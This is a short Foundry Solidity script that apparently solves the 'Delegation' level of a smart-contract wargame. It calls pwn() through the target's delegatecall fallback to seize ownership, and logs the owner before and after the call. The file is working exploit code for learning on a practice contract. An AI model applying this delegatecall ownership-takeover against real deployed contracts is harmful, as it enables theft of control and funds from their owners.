// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/06-Delegation.sol";

contract DelegationSolution is Script {
    Delegation public delegationInstance = Delegation(0x9F4d5373B32637826ae7D5F5571626217a78BfE9);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Owner before: ", delegationInstance.owner());
        address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        console.log("Owner after: ", delegationInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        vm.stopBroadcast();
    }
}